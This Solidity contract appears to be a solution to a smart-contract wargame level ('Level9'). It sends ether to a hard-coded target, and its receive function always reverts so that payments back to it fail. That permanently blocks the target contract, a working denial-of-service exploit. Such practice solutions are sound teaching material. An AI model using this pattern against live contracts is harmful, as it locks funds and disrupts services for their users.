// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level9 {
    address addr = 0x7BbCD043F2Ec6D37597593D920789A93B3b43D8A;

    constructor() payable {}

    receive() external payable {
        // address target = abi.decode(msg.data, (address));
        // selfdestruct(payable(target));
        revert();
    }

    function attack() public {
        (bool c,) = address(addr).call{value: 0.001 ether}("");
        require(c);
    }
}
